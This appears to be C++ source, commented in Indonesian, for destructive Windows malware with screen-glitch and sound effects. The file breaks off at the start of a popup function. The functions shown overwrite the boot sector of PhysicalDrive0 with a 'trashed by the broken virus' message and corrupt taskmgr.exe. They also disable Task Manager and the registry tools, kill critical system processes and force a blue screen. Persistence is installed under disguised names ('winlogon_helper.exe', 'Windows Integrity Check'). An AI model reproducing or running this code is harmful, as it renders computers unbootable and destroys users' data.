#include <Windows.h>
#include <cstdlib>
#include <ctime>
#include <cmath>
#include <thread>
#include <vector>
#include <algorithm>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <cctype>
#include <cstring>
#include <mmsystem.h>
#include <dwmapi.h>
#include <winternl.h>
#include <psapi.h>
#include <shlobj.h>
#include <VersionHelpers.h>
#include <shellapi.h>
#include <winioctl.h>
#include <ntdddisk.h>
#include <aclapi.h>
#include <setupapi.h>
#include <cfgmgr32.h>
#include <initguid.h>
#include <virtdisk.h>
#include <wincrypt.h>
#include <gdiplus.h>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "virtdisk.lib")
#pragma comment(lib, "setupapi.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "dwmapi.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

using namespace Gdiplus;

// Konfigurasi intensitas
const int REFRESH_RATE = 3;
const int MAX_GLITCH_INTENSITY = 15000;
const int GLITCH_LINES = 3000;
const int MAX_GLITCH_BLOCKS = 1500;
const int SOUND_CHANCE = 1;

// Variabel global
HBITMAP hGlitchBitmap = NULL;
BYTE* pPixels = NULL;
int screenWidth, screenHeight;
BITMAPINFO bmi = {};
int intensityLevel = 1;
DWORD startTime = GetTickCount();
int cursorX = 0, cursorY = 0;
bool cursorVisible = true;
int screenShakeX = 0, screenShakeY = 0;
bool textCorruptionActive = false;
DWORD lastEffectTime = 0;
ULONG_PTR gdiplusToken;

// Mode destruktif
bool criticalMode = false;
DWORD bsodTriggerTime = 0;
bool persistenceInstalled = false;
bool disableTaskManager = false;
bool disableRegistryTools = false;
bool fileCorruptionActive = false;
bool processKillerActive = false;
bool g_isAdmin = false;
bool destructiveActionsTriggered = false;

// Struktur untuk efek partikel
struct Particle {
    float x, y;
    float vx, vy;
    DWORD life;
    DWORD maxLife;
    COLORREF color;
    int size;
    int type;  // 0: normal, 1: trail, 2: explosion
};

// Struktur untuk efek teks korup
struct CorruptedText {
    int x, y;
    std::wstring text;
    DWORD creationTime;
    DWORD life;
};

std::vector<Particle> particles;
std::vector<CorruptedText> corruptedTexts;

// ======== TIPE BARU UNTUK PERBAIKAN ========
typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS)(HANDLE, PBOOL);
typedef BOOL (WINAPI *LPFN_Wow64DisableWow64FsRedirection)(PVOID*);
typedef BOOL (WINAPI *LPFN_Wow64RevertWow64FsRedirection)(PVOID);

#ifndef STATUS_SYSTEM_PROCESS_TERMINATED
#define STATUS_SYSTEM_PROCESS_TERMINATED ((NTSTATUS)0xC000021AL)
#endif

// ======== FUNGSI ADMIN DESTRUCTIVE ========
BOOL IsRunAsAdmin() {
    BOOL fIsRunAsAdmin = FALSE;
    PSID pAdministratorsGroup = NULL;

    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdministratorsGroup)) {
        CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin);
        FreeSid(pAdministratorsGroup);
    }
    return fIsRunAsAdmin;
}

void OverwriteBootSector() {
    HANDLE hDrive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDrive == INVALID_HANDLE_VALUE) return;

    // Boot sector dengan pesan BIOS
    BYTE bootSector[512] = {
        0xEB, 0x3C, 0x90, // JMP + NOP
        
        // Pesan
        'Y','o','u','r',' ','c','o','m','p','u','t','e','r',' ',
        'h','a','s',' ','b','e','e','n',' ',
        't','r','a','s','h','e','d',' ','b','y',' ',
        't','h','e',' ','b','r','o','k','e','n',' ',
        'v','i','r','u','s','.','.','.',0,
        
        // Kode utama
        0x31, 0xC0,       // xor ax, ax
        0x8E, 0xD8,       // mov ds, ax
        0x8E, 0xC0,       // mov es, ax
        0xB8, 0x03, 0x00, // mov ax, 0x0003
        0xCD, 0x10,       // int 0x10
        0xBE, 0x03, 0x7C, // mov si, 0x7C03
        0x8A, 0x04,       // mov al, [si]
        0x08, 0xC0,       // or al, al
        0x74, 0x0C,       // jz halt
        0xB4, 0x0E,       // mov ah, 0x0E
        0xB7, 0x00,       // mov bh, 0
        0xCD, 0x10,       // int 0x10
        0x46,             // inc si
        0xEB, 0xEF,       // jmp print_loop
        0xFA,             // cli
        0xF4,             // hlt
        0xEB, 0xFE        // jmp $
    };

    // Isi sisa dengan 0
    for (int i = 62; i < 510; i++) {
        bootSector[i] = 0;
    }

    // Boot signature
    bootSector[510] = 0x55;
    bootSector[511] = 0xAA;

    DWORD bytesWritten;
    WriteFile(hDrive, bootSector, 512, &bytesWritten, NULL);
    FlushFileBuffers(hDrive);
    CloseHandle(hDrive);
}

void DisableCtrlAltDel() {
    HKEY hKey;
    DWORD value = 1; // Deklarasi di luar blok if
    
    if (RegCreateKeyExW(HKEY_CURRENT_USER, 
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegSetValueExW(hKey, L"DisableChangePassword", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegSetValueExW(hKey, L"DisableLockWorkstation", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegCloseKey(hKey);
    }

    if (g_isAdmin) {
        if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, 
            L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
            0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
            RegSetValueExW(hKey, L"DisableChangePassword", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
            RegSetValueExW(hKey, L"DisableLockWorkstation", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
            RegCloseKey(hKey);
        }
    }
}

void SetCriticalProcess() {
    typedef NTSTATUS(NTAPI* pRtlSetProcessIsCritical)(
        BOOLEAN bNew,
        BOOLEAN *pbOld,
        BOOLEAN bNeedScb
    );

    HMODULE hNtDll = LoadLibraryW(L"ntdll.dll");
    if (hNtDll) {
        pRtlSetProcessIsCritical RtlSetProcessIsCritical = 
            (pRtlSetProcessIsCritical)GetProcAddress(hNtDll, "RtlSetProcessIsCritical");
        if (RtlSetProcessIsCritical) {
            RtlSetProcessIsCritical(TRUE, NULL, FALSE);
        }
        FreeLibrary(hNtDll);
    }
}

void KillCriticalProcesses();

void BreakTaskManager() {
    // Corrupt taskmgr.exe
    const wchar_t* taskmgrPaths[] = {
        L"C:\\Windows\\System32\\taskmgr.exe",
        L"C:\\Windows\\SysWOW64\\taskmgr.exe"
    };

    for (size_t i = 0; i < sizeof(taskmgrPaths)/sizeof(taskmgrPaths[0]); i++) {
        HANDLE hFile = CreateFileW(taskmgrPaths[i], GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD fileSize = GetFileSize(hFile, NULL);
            if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
                BYTE* buffer = new BYTE[fileSize];
                if (buffer) {
                    for (DWORD j = 0; j < fileSize; j++) {
                        buffer[j] = rand() % 256;
                    }
                    DWORD written;
                    WriteFile(hFile, buffer, fileSize, &written, NULL);
                    delete[] buffer;
                }
            }
            CloseHandle(hFile);
        }
    }

    KillCriticalProcesses();
}

// ============== DESTRUCTIVE FEATURES ==============
void ExecuteDestructiveActions() {
    if (destructiveActionsTriggered) return;
    destructiveActionsTriggered = true;

    // Hanya timpa boot sector
    if (g_isAdmin) {
        OverwriteBootSector();
    }
}

// ======== FUNGSI SUARA & EFEK VISUAL ========
void PlayGlitchSoundAsync() {
    std::thread([]() {
        int soundType = rand() % 30;
        
        switch (soundType) {
        case 0: case 1: case 2: case 3:
            PlaySound(TEXT("SystemHand"), NULL, SND_ALIAS | SND_ASYNC);
            break;
        case 4: case 5:
            PlaySound(TEXT("SystemExclamation"), NULL, SND_ALIAS | SND_ASYNC);
            break;
        case 6: case 7:
            Beep(rand() % 5000 + 500, rand() % 200 + 50);
            break;
        case 8: case 9:
            for (int i = 0; i < 100; i++) {
                Beep(rand() % 7000 + 500, 10);
                Sleep(1);
            }
            break;
        case 10: case 11:
            Beep(rand() % 100 + 30, rand() % 600 + 300);
            break;
        case 12: case 13:
            for (int i = 0; i < 50; i++) {
                Beep(rand() % 5000 + 500, rand() % 50 + 10);
                Sleep(1);
            }
            break;
        case 14: case 15:
            for (int i = 0; i < 500; i += 5) {
                Beep(300 + i * 10, 5);
            }
            break;
        case 16: case 17:
            for (int i = 0; i < 15; i++) {
                Beep(50 + i * 100, 300);
            }
            break;
        case 18: case 19:
            for (int i = 0; i < 20; i++) {
                Beep(10000 - i * 400, 20);
            }
            break;
        default:
            for (int i = 0; i < 100; i++) {
                Beep(rand() % 8000 + 500, 10);
                Sleep(1);
            }
            break;
        }
    }).detach();
}

void CaptureScreen(HWND) {
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    
    if (!hGlitchBitmap) {
        screenWidth = GetSystemMetrics(SM_CXSCREEN);
        screenHeight = GetSystemMetrics(SM_CYSCREEN);
        
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = screenWidth;
        bmi.bmiHeader.biHeight = -screenHeight;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biCompression = BI_RGB;
        
        hGlitchBitmap = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&pPixels, NULL, 0);
    }
    
    if (hGlitchBitmap) {
        SelectObject(hdcMem, hGlitchBitmap);
        BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);
    }
    
    POINT pt;
    GetCursorPos(&pt);
    cursorX = pt.x;
    cursorY = pt.y;
    
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
}

void ApplyColorShift(BYTE* pixels, int shift) {
    for (int i = 0; i < screenWidth * screenHeight * 4; i += 4) {
        if (i + shift + 2 < screenWidth * screenHeight * 4) {
            BYTE temp = pixels[i];
            pixels[i] = pixels[i + shift];
            pixels[i + shift] = temp;
        }
    }
}

void ApplyScreenShake() {
    screenShakeX = (rand() % 80 - 40) * intensityLevel;
    screenShakeY = (rand() % 80 - 40) * intensityLevel;
}

void ApplyCursorEffect() {
    if (!cursorVisible || !pPixels) return;
    
    int cursorSize = std::min(100 * intensityLevel, 1000);
    int startX = std::max(cursorX - cursorSize, 0);
    int startY = std::max(cursorY - cursorSize, 0);
    int endX = std::min(cursorX + cursorSize, screenWidth - 1);
    int endY = std::min(cursorY + cursorSize, screenHeight - 1);
    
    for (int y = startY; y <= endY; y++) {
        for (int x = startX; x <= endX; x++) {
            float dx = static_cast<float>(x - cursorX);
            float dy = static_cast<float>(y - cursorY);
            float dist = sqrt(dx * dx + dy * dy);
            
            if (dist < cursorSize) {
                int pos = (y * screenWidth + x) * 4;
                if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                    pPixels[pos] = 255 - pPixels[pos];
                    pPixels[pos + 1] = 255 - pPixels[pos + 1];
                    pPixels[pos + 2] = 255 - pPixels[pos + 2];
                    
                    if (dist < cursorSize / 2) {
                        float amount = 1.0f - (dist / (cursorSize / 2.0f));
                        int shiftX = static_cast<int>(dx * amount * 30);
                        int shiftY = static_cast<int>(dy * amount * 30);
                        
                        int srcX = x - shiftX;
                        int srcY = y - shiftY;
                        
                        if (srcX >= 0 && srcX < screenWidth && srcY >= 0 && srcY < screenHeight) {
                            int srcPos = (srcY * screenWidth + srcX) * 4;
                            if (srcPos >= 0 && srcPos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                                pPixels[pos] = pPixels[srcPos];
                                pPixels[pos + 1] = pPixels[srcPos + 1];
                                pPixels[pos + 2] = pPixels[srcPos + 2];
                            }
                        }
                    }
                }
            }
        }
    }
}

void UpdateParticles() {
    if (rand() % 3 == 0) {
        Particle p;
        p.x = rand() % screenWidth;
        p.y = rand() % screenHeight;
        p.vx = (rand() % 400 - 200) / 20.0f;
        p.vy = (rand() % 400 - 200) / 20.0f;
        p.life = 0;
        p.maxLife = 100 + rand() % 400;
        p.color = RGB(rand() % 256, rand() % 256, rand() % 256);
        p.size = 2 + rand() % 8;
        p.type = rand() % 3;
        particles.push_back(p);
    }
    
    for (auto it = particles.begin(); it != particles.end(); ) {
        it->x += it->vx;
        it->y += it->vy;
        it->life++;
        
        if (it->life > it->maxLife) {
            it = particles.erase(it);
        } else {
            int x = static_cast<int>(it->x);
            int y = static_cast<int>(it->y);
            if (x >= 0 && x < screenWidth && y >= 0 && y < screenHeight) {
                for (int py = -it->size; py <= it->size; py++) {
                    for (int px = -it->size; px <= it->size; px++) {
                        int pxPos = x + px;
                        int pyPos = y + py;
                        if (pxPos >= 0 && pxPos < screenWidth && pyPos >= 0 && pyPos < screenHeight) {
                            int pos = (pyPos * screenWidth + pxPos) * 4;
                            if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                                if (it->type == 0) {
                                    pPixels[pos] = GetBValue(it->color);
                                    pPixels[pos + 1] = GetGValue(it->color);
                                    pPixels[pos + 2] = GetRValue(it->color);
                                } else if (it->type == 1) {
                                    pPixels[pos] = std::min(pPixels[pos] + 50, 255);
                                    pPixels[pos + 1] = std::min(pPixels[pos + 1] + 50, 255);
                                    pPixels[pos + 2] = std::min(pPixels[pos + 2] + 50, 255);
                                } else {
                                    pPixels[pos] = GetBValue(it->color) / 2 + pPixels[pos] / 2;
                                    pPixels[pos + 1] = GetGValue(it->color) / 2 + pPixels[pos + 1] / 2;
                                    pPixels[pos + 2] = GetRValue(it->color) / 2 + pPixels[pos + 2] / 2;
                                }
                            }
                        }
                    }
                }
            }
            ++it;
        }
    }
}

void ApplyMeltingEffect(BYTE* originalPixels) {
    int meltHeight = 150 + (rand() % 300) * intensityLevel;
    if (meltHeight < 30) meltHeight = 30;
    
    for (int y = screenHeight - meltHeight; y < screenHeight; y++) {
        int meltAmount = (screenHeight - y) * 4;
        for (int x = 0; x < screenWidth; x++) {
            int targetY = y + (rand() % meltAmount) - (meltAmount / 2);
            if (targetY < screenHeight && targetY >= 0) {
                int srcPos = (y * screenWidth + x) * 4;
                int dstPos = (targetY * screenWidth + x) * 4;
                
                if (srcPos >= 0 && srcPos < static_cast<int>(screenWidth * screenHeight * 4) - 4 &&
                    dstPos >= 0 && dstPos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                    pPixels[dstPos] = originalPixels[srcPos];
                    pPixels[dstPos + 1] = originalPixels[srcPos + 1];
                    pPixels[dstPos + 2] = originalPixels[srcPos + 2];
                }
            }
        }
    }
}

void ApplyTextCorruption() {
    if (!textCorruptionActive) return;
    
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
    SelectObject(hdcMem, hBitmap);
    BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);
    
    if (rand() % 100 < 70) {
        CorruptedText ct;
        ct.x = rand() % (screenWidth - 300);
        ct.y = rand() % (screenHeight - 100);
        ct.creationTime = GetTickCount();
        ct.life = 5000 + rand() % 7000;
        
        int textLength = 20 + rand() % 50;
        for (int i = 0; i < textLength; i++) {
            wchar_t c;
            if (rand() % 2 == 0) {
                c = static_cast<wchar_t>(0x2580 + rand() % 6);
            } else if (rand() % 3 == 0) {
                c = L'�';
            } else {
                c = static_cast<wchar_t>(0x20 + rand() % 95);
            }
            ct.text += c;
        }
        
        corruptedTexts.push_back(ct);
    }
    
    HFONT hFont = CreateFontW(
        40 + rand() % 50, 0,
        (rand() % 45) - 22, 0,
        FW_BOLD, 
        rand() % 2, rand() % 2, rand() % 2,
        DEFAULT_CHARSET,
        OUT_DEFAULT_PRECIS,
        CLIP_DEFAULT_PRECIS,
        DEFAULT_QUALITY,
        DEFAULT_PITCH | FF_DONTCARE,
        L"Terminal"
    );
    
    SelectObject(hdcMem, hFont);
    SetBkMode(hdcMem, TRANSPARENT);
    
    for (auto it = corruptedTexts.begin(); it != corruptedTexts.end(); ) {
        COLORREF color = RGB(rand() % 256, rand() % 256, rand() % 256);
        SetTextColor(hdcMem, color);
        TextOutW(hdcMem, it->x, it->y, it->text.c_str(), static_cast<int>(it->text.length()));
        
        if (GetTickCount() - it->creationTime > it->life) {
            it = corruptedTexts.erase(it);
        } else {
            it->x += (rand() % 15) - 7;
            it->y += (rand() % 15) - 7;
            ++it;
        }
    }
    
    BITMAPINFOHEADER bmih = {};
    bmih.biSize = sizeof(BITMAPINFOHEADER);
    bmih.biWidth = screenWidth;
    bmih.biHeight = -screenHeight;
    bmih.biPlanes = 1;
    bmih.biBitCount = 32;
    bmih.biCompression = BI_RGB;
    bmih.biSizeImage = 0;
    bmih.biXPelsPerMeter = 0;
    bmih.biYPelsPerMeter = 0;
    bmih.biClrUsed = 0;
    bmih.biClrImportant = 0;
    
    GetDIBits(hdcMem, hBitmap, 0, screenHeight, pPixels, (BITMAPINFO*)&bmih, DIB_RGB_COLORS);
    
    DeleteObject(hFont);
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
}

void ApplyPixelSorting() {
    int startX = rand() % screenWidth;
    int startY = rand() % screenHeight;
    int width = 150 + rand() % 500;
    int height = 150 + rand() % 500;
    
    int endX = std::min(startX + width, screenWidth);
    int endY = std::min(startY + height, screenHeight);
    
    for (int y = startY; y < endY; y++) {
        std::vector<std::pair<float, int>> brightness;
        for (int x = startX; x < endX; x++) {
            int pos = (y * screenWidth + x) * 4;
            if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                float brt = 0.299f * pPixels[pos+2] + 0.587f * pPixels[pos+1] + 0.114f * pPixels[pos];
                brightness.push_back(std::make_pair(brt, x));
            }
        }
        
        std::sort(brightness.begin(), brightness.end());
        
        std::vector<BYTE> sortedLine;
        for (auto& b : brightness) {
            int pos = (y * screenWidth + b.second) * 4;
            sortedLine.push_back(pPixels[pos]);
            sortedLine.push_back(pPixels[pos+1]);
            sortedLine.push_back(pPixels[pos+2]);
            sortedLine.push_back(pPixels[pos+3]);
        }
        
        for (int x = startX; x < endX; x++) {
            int pos = (y * screenWidth + x) * 4;
            if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                int idx = (x - startX) * 4;
                pPixels[pos] = sortedLine[idx];
                pPixels[pos+1] = sortedLine[idx+1];
                pPixels[pos+2] = sortedLine[idx+2];
                pPixels[pos+3] = sortedLine[idx+3];
            }
        }
    }
}

void ApplyStaticBars() {
    int barCount = 15 + rand() % 25;
    int barHeight = 30 + rand() % 150;
    
    for (int i = 0; i < barCount; i++) {
        int barY = rand() % screenHeight;
        int barHeightActual = std::min(barHeight, screenHeight - barY);
        
        for (int y = barY; y < barY + barHeightActual; y++) {
            for (int x = 0; x < screenWidth; x++) {
                int pos = (y * screenWidth + x) * 4;
                if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                    if (rand() % 3 == 0) {
                        pPixels[pos] = rand() % 256;
                        pPixels[pos+1] = rand() % 256;
                        pPixels[pos+2] = rand() % 256;
                    }
                }
            }
        }
    }
}

void ApplyInversionWaves() {
    int centerX = rand() % screenWidth;
    int centerY = rand() % screenHeight;
    int maxRadius = 300 + rand() % 1000;
    float speed = 0.3f + (rand() % 100) / 100.0f;
    DWORD currentTime = GetTickCount();
    
    for (int y = 0; y < screenHeight; y++) {
        for (int x = 0; x < screenWidth; x++) {
            float dx = static_cast<float>(x - centerX);
            float dy = static_cast<float>(y - centerY);
            float dist = sqrt(dx*dx + dy*dy);
            
            if (dist < maxRadius) {
                float wave = sin(dist * 0.03f - currentTime * 0.003f * speed) * 0.5f + 0.5f;
                if (wave > 0.5f) {
                    int pos = (y * screenWidth + x) * 4;
                    if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                        pPixels[pos] = 255 - pPixels[pos];
                        pPixels[pos+1] = 255 - pPixels[pos+1];
                        pPixels[pos+2] = 255 - pPixels[pos+2];
                    }
                }
            }
        }
    }
}

void ApplyDistortionEffect() {
    int centerX = rand() % screenWidth;
    int centerY = rand() % screenHeight;
    int radius = 300 + rand() % 800;
    int distortion = 50 + rand() % (150 * intensityLevel);
    
    int yStart = std::max(centerY - radius, 0);
    int yEnd = std::min(centerY + radius, screenHeight);
    int xStart = std::max(centerX - radius, 0);
    int xEnd = std::min(centerX + radius, screenWidth);
    
    for (int y = yStart; y < yEnd; y++) {
        for (int x = xStart; x < xEnd; x++) {
            float dx = static_cast<float>(x - centerX);
            float dy = static_cast<float>(y - centerY);
            float distance = sqrt(dx*dx + dy*dy);
            
            if (distance < radius) {
                float amount = pow(1.0f - (distance / radius), 2.5f);
                int shiftX = static_cast<int>(dx * amount * distortion * (rand() % 5 - 2));
                int shiftY = static_cast<int>(dy * amount * distortion * (rand() % 5 - 2));
                
                int srcX = x - shiftX;
                int srcY = y - shiftY;
                
                if (srcX >= 0 && srcX < screenWidth && srcY >= 0 && srcY < screenHeight) {
                    int srcPos = (srcY * screenWidth + srcX) * 4;
                    int destPos = (y * screenWidth + x) * 4;
                    
                    if (destPos >= 0 && destPos < static_cast<int>(screenWidth * screenHeight * 4) - 4 && 
                        srcPos >= 0 && srcPos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                        pPixels[destPos] = pPixels[srcPos];
                        pPixels[destPos + 1] = pPixels[srcPos + 1];
                        pPixels[destPos + 2] = pPixels[srcPos + 2];
                    }
                }
            }
        }
    }
}

// ======== FUNGSI PERSISTENSI & DESTRUKSI ========
BOOL IsWindows64() {
    BOOL bIsWow64 = FALSE;
    LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(
        GetModuleHandle(TEXT("kernel32")), "IsWow64Process");
    
    if (fnIsWow64Process) {
        fnIsWow64Process(GetCurrentProcess(), &bIsWow64);
    }
    return bIsWow64;
}

void InstallPersistence() {
    wchar_t szPath[MAX_PATH];
    GetModuleFileNameW(NULL, szPath, MAX_PATH);
    
    wchar_t targetPath[MAX_PATH];
    if (g_isAdmin) {
        GetSystemDirectoryW(targetPath, MAX_PATH);
        lstrcatW(targetPath, L"\\winlogon_helper.exe");
    } else {
        SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, targetPath);
        lstrcatW(targetPath, L"\\system_health.exe");
    }
    
    PVOID oldRedir = NULL;
    if (IsWindows64()) {
        HMODULE hKernel32 = GetModuleHandle(TEXT("kernel32"));
        if (hKernel32) {
            LPFN_Wow64DisableWow64FsRedirection pfnDisable = 
                reinterpret_cast<LPFN_Wow64DisableWow64FsRedirection>(
                    GetProcAddress(hKernel32, "Wow64DisableWow64FsRedirection"));
            if (pfnDisable) pfnDisable(&oldRedir);
        }
    }
    
    CopyFileW(szPath, targetPath, FALSE);
    
    HKEY hKey;
    if (g_isAdmin) {
        RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                       0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
    } else {
        RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                       0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
    }
    RegSetValueExW(hKey, L"SystemHealthMonitor", 0, REG_SZ, (BYTE*)targetPath, (lstrlenW(targetPath) + 1) * sizeof(wchar_t));
    RegCloseKey(hKey);
    
    SYSTEMTIME st;
    GetLocalTime(&st);
    
    wchar_t cmd[1024];
    wsprintfW(cmd, 
        L"schtasks /create /tn \"Windows Integrity Check\" /tr \"\\\"%s\\\"\" /sc minute /mo 1 /st %02d:%02d /f",
        targetPath, st.wHour, st.wMinute);
    
    STARTUPINFOW si = {};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi;
    CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    if (oldRedir && IsWindows64()) {
        HMODULE hKernel32 = GetModuleHandle(TEXT("kernel32"));
        if (hKernel32) {
            LPFN_Wow64RevertWow64FsRedirection pfnRevert = 
                reinterpret_cast<LPFN_Wow64RevertWow64FsRedirection>(
                    GetProcAddress(hKernel32, "Wow64RevertWow64FsRedirection"));
            if (pfnRevert) pfnRevert(oldRedir);
        }
    }
    
    persistenceInstalled = true;
}

void DisableSystemTools() {
    HKEY hKey;
    RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
                   0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
    DWORD value = 1;
    RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
    RegSetValueExW(hKey, L"DisableRegistryTools", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
    RegCloseKey(hKey);
    
    if (g_isAdmin) {
        RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
                       0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
        RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegSetValueExW(hKey, L"DisableRegistryTools", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegCloseKey(hKey);
    }
    
    disableTaskManager = true;
    disableRegistryTools = true;
}

void KillCriticalProcesses() {
    const wchar_t* targets[] = {
        L"taskmgr.exe",
        L"explorer.exe",
        L"msconfig.exe",
        L"cmd.exe",
        L"powershell.exe",
        L"regedit.exe",
        L"mmc.exe",
        L"services.exe",
        L"svchost.exe",
        L"winlogon.exe",
        L"dwm.exe",
        L"csrss.exe"
    };
    
    DWORD processes[1024], cbNeeded;
    if (EnumProcesses(processes, sizeof(processes), &cbNeeded)) {
        DWORD cProcesses = cbNeeded / sizeof(DWORD);
        
        for (DWORD i = 0; i < cProcesses; i++) {
            wchar_t szProcessName[MAX_PATH] = L"<unknown>";
            
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_TERMINATE, FALSE, processes[i]);
            if (hProcess) {
                HMODULE hMod;
                DWORD cbNeeded;
                
                if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
                    GetModuleBaseNameW(hProcess, hMod, szProcessName, sizeof(szProcessName)/sizeof(wchar_t));
                    
                    for (size_t j = 0; j < sizeof(targets)/sizeof(targets[0]); j++) {
                        if (lstrcmpiW(szProcessName, targets[j]) == 0) {
                            TerminateProcess(hProcess, 0);
                            break;
                        }
                    }
                }
                CloseHandle(hProcess);
            }
        }
    }
    
    processKillerActive = true;
}

void TriggerBSOD() {
    // Pendekatan lebih agresif untuk trigger BSOD
    HMODULE ntdll = GetModuleHandle(TEXT("ntdll.dll"));
    if (ntdll) {
        typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
        pdef_NtRaiseHardError NtRaiseHardError = 
            reinterpret_cast<pdef_NtRaiseHardError>(GetProcAddress(ntdll, "NtRaiseHardError"));
        
        if (NtRaiseHardError) {
            ULONG Response;
            NTSTATUS status = STATUS_SYSTEM_PROCESS_TERMINATED;
            NtRaiseHardError(status, 0, 0, 0, 6, &Response);
        }
    }
    
    // Pendekatan alternatif
    typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
    typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
    
    HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
    if (hNtdll) {
        pdef_RtlAdjustPrivilege RtlAdjustPrivilege = 
            reinterpret_cast<pdef_RtlAdjustPrivilege>(GetProcAddress(hNtdll, "RtlAdjustPrivilege"));
        pdef_NtRaiseHardError NtRaiseHardError = 
            reinterpret_cast<pdef_NtRaiseHardError>(GetProcAddress(hNtdll, "NtRaiseHardError"));
        
        if (RtlAdjustPrivilege && NtRaiseHardError) {
            BOOLEAN bEnabled;
            RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled);
            ULONG Response;
            NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &Response);
        }
        FreeLibrary(hNtdll);
    }
    
    // Force crash
    int* p = reinterpret_cast<int*>(0xDEADDEAD);
    *p = 0;
}

// ======== FUNGSI POPUP & DESTRUKSI ========
void OpenRandomPopups() {
